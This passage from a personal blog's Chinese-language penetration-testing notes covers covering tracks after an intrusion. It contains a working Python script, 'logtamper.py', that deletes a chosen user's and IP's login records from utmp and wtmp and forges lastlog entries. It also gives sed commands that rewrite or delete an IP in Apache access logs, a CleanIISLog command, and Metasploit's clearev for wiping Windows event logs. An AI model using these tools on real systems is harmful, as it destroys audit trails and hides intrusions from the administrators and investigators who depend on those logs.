class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> os, struct, sys</span><br><span class="line"><span class="keyword">from</span> pwd <span class="keyword">import</span> getpwnam</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> strptime, mktime</span><br><span class="line"><span class="keyword">from</span> optparse <span class="keyword">import</span> OptionParser</span><br><span class="line">  </span><br><span class="line">UTMPFILE = <span class="string">&quot;/var/run/utmp&quot;</span></span><br><span class="line">WTMPFILE = <span class="string">&quot;/var/log/wtmp&quot;</span></span><br><span class="line">LASTLOGFILE = <span class="string">&quot;/var/log/lastlog&quot;</span></span><br><span class="line">  </span><br><span class="line">LAST_STRUCT = <span class="string">&#x27;I32s256s&#x27;</span></span><br><span class="line">LAST_STRUCT_SIZE = struct.calcsize(LAST_STRUCT)</span><br><span class="line">  </span><br><span class="line">XTMP_STRUCT = <span class="string">&#x27;hi32s4s32s256shhiii4i20x&#x27;</span></span><br><span class="line">XTMP_STRUCT_SIZE = struct.calcsize(XTMP_STRUCT)</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getXtmp</span>(<span class="params">filename, username, hostname</span>):</span><br><span class="line">    xtmp = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        fp = <span class="built_in">open</span>(filename, <span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="built_in">bytes</span> = fp.read(XTMP_STRUCT_SIZE)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">bytes</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">  </span><br><span class="line">            data = struct.unpack(XTMP_STRUCT, <span class="built_in">bytes</span>)</span><br><span class="line">            record = [(<span class="keyword">lambda</span> s: <span class="built_in">str</span>(s).split(<span class="string">&quot;\0&quot;</span>, <span class="number">1</span>)[<span class="number">0</span>])(i) <span class="keyword">for</span> i <span class="keyword">in</span> data]</span><br><span class="line">            <span class="keyword">if</span> (record[<span class="number">4</span>] == username <span class="keyword">and</span> record[<span class="number">5</span>] == hostname):</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            xtmp += <span class="built_in">bytes</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        showMessage(<span class="string">&#x27;Cannot open file: %s&#x27;</span> % filename)</span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        fp.close()</span><br><span class="line">    <span class="keyword">return</span> xtmp</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">modifyLast</span>(<span class="params">filename, username, hostname, ttyname, strtime</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        p = getpwnam(username)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        showMessage(<span class="string">&#x27;No such user.&#x27;</span>)</span><br><span class="line">  </span><br><span class="line">    timestamp = <span class="number">0</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        str2time = strptime(strtime, <span class="string">&#x27;%Y:%m:%d:%H:%M:%S&#x27;</span>)</span><br><span class="line">        timestamp = <span class="built_in">int</span>(mktime(str2time))</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        showMessage(<span class="string">&#x27;Time format err.&#x27;</span>)</span><br><span class="line">  </span><br><span class="line">    data = struct.pack(LAST_STRUCT, timestamp, ttyname, hostname)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        fp = <span class="built_in">open</span>(filename, <span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line">        fp.seek(LAST_STRUCT_SIZE * p.pw_uid)</span><br><span class="line">        fp.write(data)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        showMessage(<span class="string">&#x27;Cannot open file: %s&#x27;</span> % filename)</span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        fp.close()</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">showMessage</span>(<span class="params">msg</span>):</span><br><span class="line">    <span class="built_in">print</span> msg</span><br><span class="line">    exit(-<span class="number">1</span>)</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">saveFile</span>(<span class="params">filename, contents</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        fp = <span class="built_in">open</span>(filename, <span class="string">&#x27;w+b&#x27;</span>)</span><br><span class="line">        fp.write(contents)</span><br><span class="line">    <span class="keyword">except</span> IOError <span class="keyword">as</span> e:</span><br><span class="line">        showMessage(e)</span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        fp.close()</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    usage = <span class="string">&#x27;usage: logtamper.py -m 2 -u root -i 192.168.0.188\n \</span></span><br><span class="line"><span class="string">        logtamper.py -m 3 -u root -i 192.168.0.188 -t tty1 -d 2015:05:28:10:11:12&#x27;</span></span><br><span class="line">    parser = OptionParser(usage=usage)</span><br><span class="line">    parser.add_option(<span class="string">&#x27;-m&#x27;</span>, <span class="string">&#x27;--mode&#x27;</span>, dest=<span class="string">&#x27;MODE&#x27;</span>, default=<span class="string">&#x27;1&#x27;</span> , <span class="built_in">help</span>=<span class="string">&#x27;1: utmp, 2: wtmp, 3: lastlog [default: 1]&#x27;</span>)</span><br><span class="line">    parser.add_option(<span class="string">&#x27;-t&#x27;</span>, <span class="string">&#x27;--ttyname&#x27;</span>, dest=<span class="string">&#x27;TTYNAME&#x27;</span>)</span><br><span class="line">    parser.add_option(<span class="string">&#x27;-f&#x27;</span>, <span class="string">&#x27;--filename&#x27;</span>, dest=<span class="string">&#x27;FILENAME&#x27;</span>)</span><br><span class="line">    parser.add_option(<span class="string">&#x27;-u&#x27;</span>, <span class="string">&#x27;--username&#x27;</span>, dest=<span class="string">&#x27;USERNAME&#x27;</span>)</span><br><span class="line">    parser.add_option(<span class="string">&#x27;-i&#x27;</span>, <span class="string">&#x27;--hostname&#x27;</span>, dest=<span class="string">&#x27;HOSTNAME&#x27;</span>)</span><br><span class="line">    parser.add_option(<span class="string">&#x27;-d&#x27;</span>, <span class="string">&#x27;--dateline&#x27;</span>, dest=<span class="string">&#x27;DATELINE&#x27;</span>)</span><br><span class="line">    (options, args) = parser.parse_args()</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(args) &lt; <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> options.MODE == <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">            <span class="keyword">if</span> options.USERNAME == <span class="literal">None</span> <span class="keyword">or</span> options.HOSTNAME == <span class="literal">None</span>:</span><br><span class="line">                showMessage(<span class="string">&#x27;+[Warning]: Incorrect parameter.\n&#x27;</span>)</span><br><span class="line">  </span><br><span class="line">            <span class="keyword">if</span> options.FILENAME == <span class="literal">None</span>:</span><br><span class="line">                options.FILENAME = UTMPFILE</span><br><span class="line">  </span><br><span class="line">            <span class="comment"># tamper</span></span><br><span class="line">            newData = getXtmp(options.FILENAME, options.USERNAME, options.HOSTNAME)</span><br><span class="line">            saveFile(options.FILENAME, newData)</span><br><span class="line">  </span><br><span class="line">        <span class="keyword">elif</span> options.MODE == <span class="string">&#x27;2&#x27;</span>:</span><br><span class="line">            <span class="keyword">if</span> options.USERNAME == <span class="literal">None</span> <span class="keyword">or</span> options.HOSTNAME == <span class="literal">None</span>:</span><br><span class="line">                showMessage(<span class="string">&#x27;+[Warning]: Incorrect parameter.\n&#x27;</span>)</span><br><span class="line">  </span><br><span class="line">            <span class="keyword">if</span> options.FILENAME == <span class="literal">None</span>:</span><br><span class="line">                options.FILENAME = WTMPFILE</span><br><span class="line">  </span><br><span class="line">            <span class="comment"># tamper</span></span><br><span class="line">            newData = getXtmp(options.FILENAME, options.USERNAME, options.HOSTNAME)</span><br><span class="line">            saveFile(options.FILENAME, newData)</span><br><span class="line">  </span><br><span class="line">        <span class="keyword">elif</span> options.MODE == <span class="string">&#x27;3&#x27;</span>:</span><br><span class="line">            <span class="keyword">if</span> options.USERNAME == <span class="literal">None</span> <span class="keyword">or</span> options.HOSTNAME == <span class="literal">None</span> <span class="keyword">or</span> options.TTYNAME == <span class="literal">None</span> <span class="keyword">or</span> options.DATELINE == <span class="literal">None</span>:</span><br><span class="line">                showMessage(<span class="string">&#x27;+[Warning]: Incorrect parameter.\n&#x27;</span>)</span><br><span class="line">  </span><br><span class="line">            <span class="keyword">if</span> options.FILENAME == <span class="literal">None</span>:</span><br><span class="line">                options.FILENAME = LASTLOGFILE</span><br><span class="line">  </span><br><span class="line">            <span class="comment"># tamper</span></span><br><span class="line">            modifyLast(options.FILENAME, options.USERNAME, options.HOSTNAME, options.TTYNAME , options.DATELINE)</span><br><span class="line">  </span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            parser.print_help()</span><br></pre></td></tr></table></figure>

<h3 id="Web日志"><a href="#Web日志" class="headerlink" title="Web日志"></a>Web日志</h3><h4 id="Apache日志"><a href="#Apache日志" class="headerlink" title="Apache日志"></a>Apache日志</h4><blockquote>
<p><code>find / -name *access*log</code> 搜索全部日志<br><code>sed –i ‘s/192.168.122.18/192.168.122.17/’ /var/log/httpd/access.log</code>  将访问IP为192.168.122.18的地址替换为192.168.122.17<br><code>sed–i‘/192.168.122.17/’d /var/log/httpd/access.log</code> 删除访问IP为192.168.122.17的记录</p>
</blockquote>
<h4 id="IIS日志"><a href="#IIS日志" class="headerlink" title="IIS日志"></a>IIS日志</h4><p>CleanIISLog</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CleanIISLog.exe u_ex201008.log 192.168.122.18</span><br></pre></td></tr></table></figure>

<p>用工具就行了，略</p>
<h3 id="Windows日志"><a href="#Windows日志" class="headerlink" title="Windows日志"></a>Windows日志</h3><p>利用MSF</p>
<blockquote>
<p><code>runevent_manager –i</code> 查看日志及其配置信息<br><code>clearev</code> 清除系统日志</p>
</blockquote>
<hr>
<p>好！学完啦！撒花！（悲</p>
<h1 id="垃圾卓越班"><a href="#垃圾卓越班" class="headerlink" title="垃圾卓越班"></a>垃圾卓越班</h1><p>如题，垃圾卓越班，狗都不来（</p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">Dawn_whisper</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2022/07/13/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/">http://example.com/2022/07/13/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">Dawn_whisper's blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Web/">Web</a></div><div class="post_share"><div class="social-share" data-image="/img/top_img.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button button--animated"><i class="fas fa-qrcode"></i> 打赏</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="/img/wechat.png" target="_blank"><img class="post-qr-code-img" src="/img/wechat.png" alt="wechat"/></a><div class="post-qr-code-desc">wechat</div></li></ul></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2022/08/14/DEFCON2022/"><img class="prev-cover" src="https://img1.imgtp.com/2022/08/27/lRMWG6sS.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">DEFCON2022 at straw hat</div></div></a></div><div class="next-post pull-right"><a href="/2021/10/09/2021%E9%A2%86%E8%88%AA%E6%9D%AF/"><img class="next-cover" src="/img/top_img.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">2021领航杯 &amp; 蚌埠住了</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span> 相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2021/10/09/2021领航杯/" title="2021领航杯 & 蚌埠住了"><img class="cover" src="/img/top_img.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-10-09</div><div class="title">2021领航杯 & 蚌埠住了</div></div></a></div><div><a href="/2021/06/26/AWD框架/" title="AWD框架"><img class="cover" src="/img/top_img.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-06-26</div><div class="title">AWD框架</div></div></a></div><div><a href="/2022/08/14/DEFCON2022/" title="DEFCON2022 at straw hat"><img class="cover" src="https://img1.imgtp.com/2022/08/27/lRMWG6sS.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-08-14</div><div class="title">DEFCON2022 at straw hat</div></div></a></div><div><a href="/2022/08/27/First price at CISCN2022!/" title="First price at CISCN2022!"><img class="cover" src="https://img1.imgtp.com/2022/08/28/9RDGd4Cv.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-08-27</div><div class="title">First price at CISCN2022!</div></div></a></div><div><a href="/2021/06/20/Frist_AWD_at_ciscn2021/" title="First AWD at ciscn2021"><img class="cover" src="/img/top_img.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-06-20</div><div class="title">First AWD at ciscn2021</div></div></a></div><div><a href="/2020/11/07/Wp_for_Hackergame2020/" title="Write up for hackergame2020"><img class="cover" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-11-07</div><div class="title">Write up for hackergame2020</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="gitalk-container"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-info-avatar is-center"><img class="avatar-img" src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-info__name">Dawn_whisper</div><div class="author-info__description">弱到不行的crypto手+退役OI选手</div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">33</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">标签</div><div class="length-num">10</div></a></div><div class="card-info-data-item is-center"><a href="/categories/"><div class="headline">分类</div><div class="length-num">6</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/dawnwhisper"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/dawnwhisper" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:dawn_whisper@qq.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a><a class="social-icon" href="https://space.bilibili.com/179833081" target="_blank" title="Bilibili"><i class="fa-brands fa-bilibili"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">Welcome to Dawn_whisper's blog~   If you have any idea about my blog, plz send an email to me~</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0"><span class="toc-number">1.</span> <span class="toc-text">内网渗透笔记</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.1.</span> <span class="toc-text">信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#nmap"><span class="toc-number">1.1.1.</span> <span class="toc-text">nmap</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#git%E6%B3%84%E9%9C%B2"><span class="toc-number">1.1.2.</span> <span class="toc-text">.git泄露</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#svn%E6%B3%84%E9%9C%B2"><span class="toc-number">1.1.3.</span> <span class="toc-text">.svn泄露</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#burpsuite"><span class="toc-number">1.1.4.</span> <span class="toc-text">burpsuite</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%9F%E5%90%8D%E6%94%B6%E9%9B%86"><span class="toc-number">1.1.5.</span> <span class="toc-text">域名收集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E7%9C%9F%E5%AE%9EIP"><span class="toc-number">1.1.6.</span> <span class="toc-text">获取真实IP</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">1.2.</span> <span class="toc-text">漏洞分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#web%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F"><span class="toc-number">1.2.1.</span> <span class="toc-text">web漏洞扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BC%B1%E5%8F%A3%E4%BB%A4%E6%89%AB%E6%8F%8F"><span class="toc-number">1.2.2.</span> <span class="toc-text">弱口令扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#google-hacking"><span class="toc-number">1.2.3.</span> <span class="toc-text">google hacking</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Shodan"><span class="toc-number">1.2.4.</span> <span class="toc-text">Shodan</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F"><span class="toc-number">1.2.5.</span> <span class="toc-text">系统漏洞扫描</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95"><span class="toc-number">1.3.</span> <span class="toc-text">web渗透测试</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#dedecms"><span class="toc-number">1.3.1.</span> <span class="toc-text">dedecms</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Drupalcms"><span class="toc-number">1.3.2.</span> <span class="toc-text">Drupalcms</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#struts2"><span class="toc-number">1.3.3.</span> <span class="toc-text">struts2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ThinkPHP2"><span class="toc-number">1.3.4.</span> <span class="toc-text">ThinkPHP2</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%94%BB%E9%98%B2%E6%8A%80%E6%9C%AF"><span class="toc-number">1.4.</span> <span class="toc-text">攻防技术</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL"><span class="toc-number">1.4.1.</span> <span class="toc-text">SQL</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XSS"><span class="toc-number">1.4.2.</span> <span class="toc-text">XSS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CSRF"><span class="toc-number">1.4.3.</span> <span class="toc-text">CSRF</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E9%98%B2%E7%81%AB%E5%A2%99"><span class="toc-number">1.4.4.</span> <span class="toc-text">绕过防火墙</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="toc-number">1.5.</span> <span class="toc-text">权限提升</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Linux"><span class="toc-number">1.5.1.</span> <span class="toc-text">Linux</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%8A%AB%E6%8C%81"><span class="toc-number">1.5.1.1.</span> <span class="toc-text">环境变量劫持</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1"><span class="toc-number">1.5.1.2.</span> <span class="toc-text">计划任务</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.5.1.3.</span> <span class="toc-text">内核漏洞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SUID"><span class="toc-number">1.5.1.4.</span> <span class="toc-text">SUID</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Windows"><span class="toc-number">1.5.2.</span> <span class="toc-text">Windows</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#PATH%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E9%85%8D%E7%BD%AE%E9%94%99%E8%AF%AF"><span class="toc-number">1.5.2.1.</span> <span class="toc-text">PATH环境变量配置错误</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Trusted-Service-Paths"><span class="toc-number">1.5.2.2.</span> <span class="toc-text">Trusted Service Paths</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1-1"><span class="toc-number">1.5.2.3.</span> <span class="toc-text">计划任务</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%89%E6%96%B9"><span class="toc-number">1.5.3.</span> <span class="toc-text">第三方</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Serv-U"><span class="toc-number">1.5.3.1.</span> <span class="toc-text">Serv-U</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81"><span class="toc-number">1.6.</span> <span class="toc-text">权限维持</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Windows-1"><span class="toc-number">1.6.1.</span> <span class="toc-text">Windows</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%9A%90%E8%97%8F%E8%B4%A6%E6%88%B7"><span class="toc-number">1.6.1.1.</span> <span class="toc-text">隐藏账户</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BC%96%E8%BE%91%E6%B3%A8%E5%86%8C%E8%A1%A8"><span class="toc-number">1.6.1.2.</span> <span class="toc-text">编辑注册表</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#shilft%E5%90%8E%E9%97%A8"><span class="toc-number">1.6.1.3.</span> <span class="toc-text">shilft后门</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Windows%E9%9A%90%E8%97%8F%E6%96%87%E4%BB%B6"><span class="toc-number">1.6.1.4.</span> <span class="toc-text">Windows隐藏文件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%B6%E4%BB%96"><span class="toc-number">1.6.1.5.</span> <span class="toc-text">其他</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Linux-1"><span class="toc-number">1.6.2.</span> <span class="toc-text">Linux</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#SSHD%E8%BD%AF%E8%BF%9E%E6%8E%A5"><span class="toc-number">1.6.2.1.</span> <span class="toc-text">SSHD软连接</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%B6%E4%BB%96-1"><span class="toc-number">1.6.2.2.</span> <span class="toc-text">其他</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%8D%E6%9D%80%E6%8A%80%E6%9C%AF"><span class="toc-number">1.6.3.</span> <span class="toc-text">免杀技术</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Metasploit"><span class="toc-number">1.6.3.1.</span> <span class="toc-text">Metasploit</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B6%E4%BB%96%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81"><span class="toc-number">1.6.4.</span> <span class="toc-text">其他权限维持</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B8%97%E9%80%8F%E6%A1%86%E6%9E%B6"><span class="toc-number">1.6.5.</span> <span class="toc-text">渗透框架</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Metasploit-1"><span class="toc-number">1.6.5.1.</span> <span class="toc-text">Metasploit</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%BB%A3%E7%90%86"><span class="toc-number">1.7.</span> <span class="toc-text">内网渗透代理</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Lcx%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91"><span class="toc-number">1.7.1.</span> <span class="toc-text">Lcx端口转发</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ssh%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91"><span class="toc-number">1.7.2.</span> <span class="toc-text">ssh端口转发</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0%E8%BD%AC%E5%8F%91"><span class="toc-number">1.7.2.1.</span> <span class="toc-text">本地转发</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%9C%E7%A8%8B%E8%BD%AC%E5%8F%91"><span class="toc-number">1.7.2.2.</span> <span class="toc-text">远程转发</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8A%A8%E6%80%81%E8%BD%AC%E5%8F%91"><span class="toc-number">1.7.2.3.</span> <span class="toc-text">动态转发</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">1.7.3.</span> <span class="toc-text">反弹shell</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#nc%E6%AD%A3%E5%90%91shell"><span class="toc-number">1.7.3.1.</span> <span class="toc-text">nc正向shell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#nc%E5%8F%8D%E5%90%91shell"><span class="toc-number">1.7.3.2.</span> <span class="toc-text">nc反向shell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#bash%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">1.7.3.3.</span> <span class="toc-text">bash反弹shell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#python%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">1.7.3.4.</span> <span class="toc-text">python反弹shell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#php%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">1.7.3.5.</span> <span class="toc-text">php反弹shell</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9A%90%E7%A7%98%E9%9A%A7%E9%81%93%E6%90%AD%E5%BB%BA"><span class="toc-number">1.8.</span> <span class="toc-text">隐秘隧道搭建</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#FRP"><span class="toc-number">1.8.1.</span> <span class="toc-text">FRP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EarthWorm"><span class="toc-number">1.8.2.</span> <span class="toc-text">EarthWorm</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#reGeorg"><span class="toc-number">1.8.3.</span> <span class="toc-text">reGeorg</span></a></li></ol></li><li 